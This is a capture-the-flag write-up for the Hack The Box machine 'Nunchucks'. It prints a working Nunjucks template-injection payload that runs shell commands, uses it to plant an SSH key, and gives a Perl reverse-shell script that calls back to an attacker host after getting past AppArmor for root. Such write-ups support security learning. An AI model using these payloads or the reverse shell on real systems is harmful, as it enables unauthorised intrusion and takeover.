---
layout: post
title: HTB Nunchucks Writeup  
subtitle: Easy Box
thumbnail-img: /assets/img/nunchucks.png
tags: [HTB]
---
![Explore](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/nunchucks.png)


| Name | Explore |
| :------ |:--- |
| OS | Linux |
| RELEASE DATE | 02 Nov 2021 |
| DIFFICULTY | Easy |

# Port Scan
IP: 10.10.11.122

Start off with a nmap scan
```
nmap -p- -oN nmap/scriptScan -sC -sV 10.10.11.122

22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)
|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)
|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Nunchucks - Landing Page
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
```

We can see a DNS name of `nunchucks.htb` so lets add it to our `/etc/hosts` file

# nunchucks.htb 

Navigating to the website we can see a signup page but registration is currently closed.

I was not able to fuzz any other page or directory out of this

# Fuzzing store.nunchucks.htb
There might be another VHOST on this box so I used ffuf to see if I could enumerate anything. I was able to find `store.nunchucks.htb`, this makes sense because at the bottom of nunchucks.htb there was a link that said "Store: Coming soon!"
```
┌──(root💀kali)-[~/htb/nunchucks]
└─# ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u https://nunchucks.htb -H "Host: FUZZ.nunchucks.htb" -fs 30589


store                   [Status: 200, Size: 4029, Words: 1053, Lines: 102]
```

I'll add `store.nunchucks.htb` to my `/etc/hosts`

Looking at the page there is not much besides a newsletter box. I tried to fuzz out any other page but this is it. 

I tried a Server-Side Template Injection test `{{7*7}}` and the server responded with `49`, it is vulnerable! After some googling, I found a website that had a payload I could use to get code execution. http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine

Request
```
POST /api/submit HTTP/1.1
Host: store.nunchucks.htb
Cookie: _csrf=MneG7M2Q13X042U-mQUtAkIs
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://store.nunchucks.htb/
Content-Type: application/json
Origin: https://store.nunchucks.htb
Content-Length: 121
Te: trailers
Connection: close

{
"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}"
}

```

Response 
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 04 Nov 2021 01:54:22 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 125
Connection: close
X-Powered-By: Express
ETag: W/"7d-G8kvLbAVp3lV4ptF5WkmaAUlwPs"

{"response":"You will receive updates on the following email address: uid=1000(david) gid=1000(david) groups=1000(david)\n."}
```

From here we have code execution and can drop our ssh private key on the machine and log in via ssh
```

"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('mkdir /home/david/.ssh')\")()}}"

"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('touch /home/david/.ssh/authorized_keys')\")()}}"

"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('echo YOUR PUB KEY >> /home/david/.ssh/authorized_keys')\")()}}"
```

We can login via ssh and grab the user flag
```
┌──(root💀kali)-[~/htb/nunchucks]
└─# ssh david@10.10.11.122 
david@nunchucks:~$ id
uid=1000(david) gid=1000(david) groups=1000(david)
david@nunchucks:~$ ls ~
user.txt
```

# Priv Esc

There is an interesting file in `/opt` called `backup.pl`. 
```
#!/usr/bin/perl
use strict;
use POSIX qw(strftime);
use DBI;
use POSIX qw(setuid); 
POSIX::setuid(0); 

my $tmpdir        = "/tmp";
my $backup_main = '/var/www';
my $now = strftime("%Y-%m-%d-%s", localtime);
my $tmpbdir = "$tmpdir/backup_$now";

sub printlog
{
    print "[", strftime("%D %T", localtime), "] $_[0]\n";
}

sub archive
{
    printlog "Archiving...";
    system("/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2>/dev/null");
    printlog "Backup complete in $tmpbdir/backup_$now.tar";
}

if ($> != 0) {
    die "You must run this script as root.\n";
}

printlog "Backup starts.";
mkdir($tmpbdir);
&archive;
printlog "Moving $tmpbdir/backup_$now to /opt/web_backups";
system("/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/");
printlog "Removing temporary directory";
rmdir($tmpbdir);
printlog "Completed";
```

Notice on line 6 it has `POSIX::setuid(0)`, this allows it to run with root privs. For this to work, it must be SUID or have a capability. Whenever a file is ran with the SUID set it is ran with the user ID of the owner of the file, not the person executing it. Here is an example below in practice. 
```
-rwxr-xr-x  1 root root 1234376 Nov  4 17:18 bash

┌──(kali㉿kali)-[~]
└─$ ./bash
┌──(kali㉿kali)-[~]
└─$ id
uid=1000(kali)

-rwsr-sr-x  1 root root 1234376 Nov  4 17:18 bash (notise the "s")

┌──(kali㉿kali)-[~]
└─$ ./bash -p                                                                                                                                                                                                                        
bash-5.1# whoami
root

```

Relating it back to `backup.pl` we can see the permissions are `-rwxr-xr-x 1 root root 838 Sep  1 12:53 backup.pl`. Notice that we dont have the SUID bit set, but the script is setting it temporarily when it runs. 

After enumerating `Apparmor` We can see the profile for `Perl`. The script allows `perl` to have `seduid` (allowing the script to run with root privs) but denies access to a handful of files
```
/usr/bin/perl {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  #include <abstractions/perl>

  capability setuid,

  deny owner /etc/nsswitch.conf r,
  deny /root/* rwx,
  deny /etc/shadow rwx,

  /usr/bin/id mrix,
  /usr/bin/ls mrix,
  /usr/bin/cat mrix,
  /usr/bin/whoami mrix,
  /opt/backup.pl mrix,
  owner /home/ r,
  owner /home/david/ r,

}

```

There was a bug posted here https://bugs.launchpad.net/apparmor/+bug/1911431 that lets us get around this by using `#!`. We can create a Perl script that will let us become root and bypass apparmor.

rev.pl
```
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
use Socket;$i="KALI-IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
```

netcat listener
`nc -lvnp 4444`

Change permissions and execute
```
root@nunchucks:/tmp# chmod +x rev.pl 
root@nunchucks:/tmp# ./rev.pl 
```

Rooted!
```
┌──(root💀kali)-[~/htb/nunchucks]
└─# nc -lvnp 4444                                                                                                                                                                                                                        1 ⨯
listening on [any] 4444 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.122] 41362
# id
uid=0(root) gid=1000(david) groups=1000(david)
```
